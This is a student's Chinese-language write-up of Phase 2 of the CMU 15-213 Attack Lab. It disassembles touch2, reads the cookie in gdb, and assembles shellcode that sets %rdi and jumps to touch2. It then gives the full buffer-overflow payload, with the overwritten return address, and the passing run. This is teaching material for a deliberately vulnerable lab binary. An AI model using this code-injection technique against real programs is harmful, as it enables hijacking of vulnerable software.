# Phase 2

```log
0000000000401867 <touch2>:
  401867:       48 83 ec 08             sub    $0x8,%rsp
  40186b:       89 fa                   mov    %edi,%edx
  40186d:       c7 05 85 2c 20 00 02    movl   $0x2,0x202c85(%rip)        # 6044fc <vlevel>
  401874:       00 00 00 
  401877:       39 3d 87 2c 20 00       cmp    %edi,0x202c87(%rip)        # 604504 <cookie>
  40187d:       74 2a                   je     4018a9 <touch2+0x42>
  40187f:       48 8d 35 c2 19 00 00    lea    0x19c2(%rip),%rsi        # 403248 <_IO_stdin_used+0x358>
  401886:       bf 01 00 00 00          mov    $0x1,%edi
  40188b:       b8 00 00 00 00          mov    $0x0,%eax
  401890:       e8 4b f5 ff ff          callq  400de0 <__printf_chk@plt>
  401895:       bf 02 00 00 00          mov    $0x2,%edi
  40189a:       e8 64 05 00 00          callq  401e03 <fail>
  40189f:       bf 00 00 00 00          mov    $0x0,%edi
  4018a4:       e8 87 f5 ff ff          callq  400e30 <exit@plt>
  4018a9:       48 8d 35 70 19 00 00    lea    0x1970(%rip),%rsi        # 403220 <_IO_stdin_used+0x330>
  4018b0:       bf 01 00 00 00          mov    $0x1,%edi
  4018b5:       b8 00 00 00 00          mov    $0x0,%eax
  4018ba:       e8 21 f5 ff ff          callq  400de0 <__printf_chk@plt>
  4018bf:       bf 02 00 00 00          mov    $0x2,%edi
  4018c4:       e8 6a 04 00 00          callq  401d33 <validate>
  4018c9:       eb d4                   jmp    40189f <touch2+0x38>
```

touch2与touch1有所不同，需要传入1个参数与之比较。

```log
(gdb) display/x cookie
5: /x cookie = 0x1fb6091a
```

比较对象cookie的内容如上所示，与同目录下的cookie.txt一致。当传入与之相同的值时，程序会跳转到4018a9继续执行，否则将以Fail的方式退出。

由于需要传入参数，使用touch1中仅跳转的方法是不够的，需要通过执行代码，修改寄存器（传递参数）再跳转到touch2。

在getbuf所输入的数据，会加载到内存中，如果将跳转位置指定到输入数据所保存的位置，那么便可以执行代码。

根据前面的分析，可以构造出以下代码：

```log
movq $0x1fb6091a, %rdi
pushq $0x401867
ret
```

通过gcc编译，再使用objdump可以导出其十六进制表示。

```log
touch2.bin:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 1a 09 b6 1f    mov    $0x1fb6091a,%rdi
   7:   68 67 18 40 00          pushq  $0x401867
   c:   c3                      retq
```

将其组合并按顺序排列，可以得到以下内容。

```log
48 c7 c7 1a 09 b6 1f 68 67 18 40 00 c3
```

然后通过gdb调试，获取输入数据所存储的位置。

```log
(gdb) p/x $rsp
$2 = 0x5567e2f8
```

同样按照小端法构造跳转地址，最终构造出以下结果。

```log
48 c7 c7 1a 09 b6 1f 68 67 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 f8 e2 67 55 00 00 00 00
```

最后运行，便可通过。

```log
hsojo@ubuntu:~/Downloads/target<stu_number>$ ./hex2raw -i touch2.txt | ./ctarget -q
Cookie: 0x1fb6091a
Type string:Touch2!: You called touch2(0x1fb6091a)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
    user id <stu_number>
    course  15213-f15
    lab attacklab
    result  -259586058:PASS:0xffffffff:ctarget:2:48 C7 C7 1A 09 B6 1F 68 67 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F8 E2 67 55 00 00 00 00 
```

